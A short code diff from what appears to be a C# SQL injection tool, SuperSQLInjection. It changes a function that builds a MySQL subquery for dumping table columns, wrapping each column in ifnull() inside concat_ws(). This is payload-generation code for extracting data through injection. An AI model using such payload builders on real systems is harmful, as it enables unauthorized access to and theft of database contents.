@@ -219,13 +219,10 @@ namespace SuperSQLInjection.payload
         public static String creatMySQLColumnsStr(List<String> columns, String table, String dbName, int limit)
         {
 
-            if (columns.Count <= 1) {
-
-            }
             StringBuilder sb = new StringBuilder("(select concat_ws(0x242424,");
             foreach (String c in columns) {
                 // sb.Append(castMySQLColumn(c)+",");
-                sb.Append(c + ",");
+                sb.Append("ifnull("+c + ",0x20),");
             }
             if (columns.Count > 0)
             {
